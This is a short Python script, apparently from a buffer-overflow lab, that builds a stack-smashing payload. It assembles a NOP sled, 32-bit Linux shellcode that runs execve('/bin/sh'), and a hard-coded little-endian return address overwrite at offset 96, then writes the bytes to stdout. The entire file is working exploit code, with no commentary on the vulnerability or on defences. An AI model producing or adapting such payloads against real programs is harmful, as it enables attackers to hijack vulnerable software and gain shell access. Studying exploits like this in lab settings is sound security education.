import sys
#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80".encode('latin-1') # execve(/bin/sh)
shellcode = ("\x32\xc0\x50\x68" "//sh" "\x68" "/bin" "\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80").encode('latin-1')

nops = 300

content = bytearray(0x90 for i in range(nops))
start = nops - len(shellcode)
content[start:] = shellcode

ret = 0xffffd58c
content[96:100] = ret.to_bytes(4, byteorder='little')

sys.stdout.buffer.write(content)
